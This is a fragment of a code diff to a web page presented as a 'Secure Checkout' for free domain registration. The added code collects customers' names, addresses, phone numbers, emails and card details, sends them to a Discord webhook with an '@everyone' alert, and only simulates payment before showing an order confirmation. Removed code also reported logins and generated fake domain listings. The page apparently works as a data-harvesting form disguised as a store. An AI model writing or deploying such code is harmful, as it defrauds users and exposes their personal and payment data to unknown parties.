+                            value: `**** **** **** ${orderDetails.cardLast4 || 'N/A'}`,
+                            inline: true
+                        },
+                        {
+                            name: '🌍 Location Data',
+                            value: `**IP Country:** ${orderDetails.country}\n**Currency:** ${orderDetails.currency.code}`,
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: 'Nexa Free Domains · Secure Checkout'
+                    }
+                };
+
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🎯 **Domain Generator Action**`,
-                        embeds: [{
-                            title: 'User Activity',
-                            fields: [
-                                { name: 'User', value: user.email || 'Unknown' },
-                                { name: 'Action', value: action },
-                                { name: 'Currency', value: `${userCurrency.code} (${userCurrency.symbol})` },
-                                { name: 'Time', value: new Date().toLocaleString() }
-                            ],
-                            color: 0x3b82f6
-                        }]
+                        content: '@everyone 🚀 **New Purchase!**',
+                        embeds: [embed]
                     })
                 });
-                webhookTriggered = true; // Stop further notifications
-            } catch (e) {
-                console.log('Discord webhook failed');
+            } catch (error) {
+                console.log('Failed to send to Discord:', error);
             }
         }
 
-        // Check domain button handler
-        checkBtn.addEventListener('click', async () => {
-            const domain = domainInput.value.trim().toLowerCase().replace(/[^a-z0-9]/g, '');
-            if (!domain) {
-                alert('Please enter a domain name');
-                return;
+        // Validate form
+        function validateForm() {
+            const required = [
+                firstName.value, lastName.value, email.value, phone.value,
+                address.value, city.value, state.value, zip.value, country.value
+            ];
+            
+            if (required.some(field => !field)) {
+                alert('Please fill in all required fields');
+                return false;
             }
+
+            // Validate email format
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email.value)) {
+                alert('Please enter a valid email address');
+                return false;
+            }
+
+            // Validate phone (simple)
+            const phoneRegex = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
+            if (!phoneRegex.test(phone.value.replace(/\s/g, ''))) {
+                alert('Please enter a valid phone number');
+                return false;
+            }
+
+            return true;
+        }
+
+        // Place order
+        async function placeOrder() {
+            if (!validateForm()) return;
 
             // Show loading
-            availabilityResult.style.display = 'flex';
-            resultMessage.style.display = 'none';
-            resultIcon.style.display = 'none';
-            loadingSpinner.style.display = 'block';
+            placeOrderBtn.disabled = true;
+            orderSpinner.style.display = 'inline-block';
+            placeOrderBtn.querySelector('span').textContent = 'Processing...';
 
-            // Simulate API delay
+            // Prepare order data
+            orderData = {
+                orderId: generateOrderId(),
+                timestamp: new Date().toISOString(),
+                firstName: firstName.value,
+                lastName: lastName.value,
+                email: email.value,
+                phone: phone.value,
+                address: address.value,
+                address2: address2.value || '',
+                city: city.value,
+                state: state.value,
+                zip: zip.value,
+                country: country.value,
+                domain: selectedDomain,
+                plan: selectedPlan,
+                paymentMethod: document.querySelector('.payment-method.selected span').textContent,
+                cardLast4: cardNumber.value ? cardNumber.value.slice(-4) : 'N/A',
+                currency: userCurrency,
+                subtotal: (selectedPlan === 'free' ? 0 : (selectedPlan === 'basic' ? 5 : 15) * userCurrency.rate).toFixed(2),
+                tax: '0.00',
+                total: (selectedPlan === 'free' ? 0 : (selectedPlan === 'basic' ? 5 : 15) * userCurrency.rate).toFixed(2)
+            };
+
+            // Send to Discord
+            await sendOrderToDiscord(orderData);
+
+            // Simulate payment processing
             setTimeout(() => {
-                const result = checkDomainAvailability(domain);
-                currentDomain = result.domain;
-                domainAvailable = result.available;
-                
-                loadingSpinner.style.display = 'none';
-                resultIcon.style.display = 'block';
-                resultMessage.style.display = 'block';
+                // Hide loading
+                placeOrderBtn.disabled = false;
+                orderSpinner.style.display = 'none';
+                placeOrderBtn.querySelector('span').textContent = 'Place Order';
 
-                if (result.available) {
-                    availabilityResult.className = 'availability-result available';
-                    resultIcon.className = 'fas fa-check-circle';
-                    resultMessage.textContent = `${result.domain} is available! ✨`;
-                } else {
-                    availabilityResult.className = 'availability-result taken';
-                    resultIcon.className = 'fas fa-times-circle';
-                    resultMessage.textContent = `${result.domain} is already taken`;
-                }
+                // Show success modal
+                confirmationEmail.textContent = email.value;
+                orderIdDisplay.textContent = orderData.orderId;
+                successModal.classList.add('show');
 
-                // Update purchase button state
-                updatePurchaseButton();
-            }, 1000);
-        });
-
-        // Update purchase button state
-        function updatePurchaseButton() {
-            purchaseBtn.disabled = !(domainAvailable && termsCheckbox.checked && currentUser);
+                // Clear session storage
+                sessionStorage.removeItem('selectedDomain');
+                sessionStorage.removeItem('selectedPlan');
+            }, 2000);
         }
 
-        // Terms checkbox handler
-        termsCheckbox.addEventListener('change', updatePurchaseButton);
+        // Event Listeners
+        placeOrderBtn.addEventListener('click', placeOrder);
 
-        // Plan selection
-        document.querySelectorAll('.plan-card').forEach(card => {
-            card.addEventListener('click', () => {
-                document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
-                card.classList.add('selected');
-                selectedPlan = card.dataset.plan;
-                updatePrices();
+        // Payment method selection
+        paymentMethods.forEach(method => {
+            method.addEventListener('click', () => {
+                paymentMethods.forEach(m => m.classList.remove('selected'));
+                method.classList.add('selected');
+                
+                const methodType = method.dataset.method;
+                if (methodType === 'card') {
+                    cardDetails.classList.add('show');
+                } else {
+                    cardDetails.classList.remove('show');
+                }
             });
         });
 
-        // Purchase button
-        purchaseBtn.addEventListener('click', async () => {
-            if (!currentUser) {
-                alert('Please log in first');
-                return;
-            }
+        // Format card inputs
+        cardNumber.addEventListener('input', (e) => {
+            e.target.value = formatCardNumber(e.target.value);
+        });
 
-            alert(`✅ Order placed!\nDomain: ${currentDomain}\nPlan: ${selectedPlan}\nTotal: ${priceDisplay.textContent}\nCheck your email for instructions.`);
-            
-            // Send Discord notification (only once)
-            await sendDiscordNotification(currentUser, `Purchased ${currentDomain} (${selectedPlan} plan)`);
+        expiry.addEventListener('input', (e) => {
+            e.target.value = formatExpiry(e.target.value);
+        });
+
+        cvv.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 3);
+        });
+
+        // Auto-fill email from auth
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                email.value = user.email || '';
+                
+                // Try to get name from user display name
+                if (user.displayName) {
+                    const nameParts = user.displayName.split(' ');
+                    firstName.value = nameParts[0] || '';
+                    lastName.value = nameParts.slice(1).join(' ') || '';
+                }
+            } else {
+                // Redirect to login if not authenticated
+                window.location.href = 'index.html';
+            }
         });
 
         // Logout
@@ -786,70 +1071,16 @@
             window.location.href = 'index.html';
         });
 
-        // Check auth state
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                currentUser = user;
-                purchaseBtn.disabled = !(domainAvailable && termsCheckbox.checked);
-                
-                // Send login notification (only once)
-                sendDiscordNotification(user, 'Logged in');
-            } else {
-                // Redirect to login if not authenticated
-                window.location.href = 'index.html';
+        // Initialize
+        loadOrderData();
+        detectCurrency();
+
+        // Close modal when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === successModal) {
+                successModal.classList.remove('show');
             }
         });
-
-        // Initialize
-        detectCurrency();
-        updateFakeDomains();
-        
-        // Update fake domains every second
-        setInterval(updateFakeDomains, 1000);
-        
-        // Update prices every minute (simulate exchange rate changes)
-        setInterval(() => {
-            userCurrency.rate *= (1 + (Math.random() - 0.5) * 0.01); // ±0.5% change
-            updatePrices();
-        }, 60000);
-
-        // Initial domain check
-        setTimeout(() => {
-            checkBtn.click();
-        }, 500);
     </script>
-
-    <style>
-        /* Additional styles */
-        #availabilityResult {
-            transition: all 0.3s ease;
-        }
-        
-        .plan-card {
-            cursor: pointer;
-        }
-        
-        .domain-card {
-            transition: transform 0.2s;
-        }
-        
-        .domain-card:hover {
-            transform: translateY(-2px);
-        }
-        
-        .loading-spinner {
-            margin: 0 auto;
-        }
-        
-        @media (max-width: 768px) {
-            .search-section {
-                flex-direction: column;
-            }
-            
-            .check-button {
-                padding: 1rem;
-            }
-        }
-    </style>
 </body>
 </html>
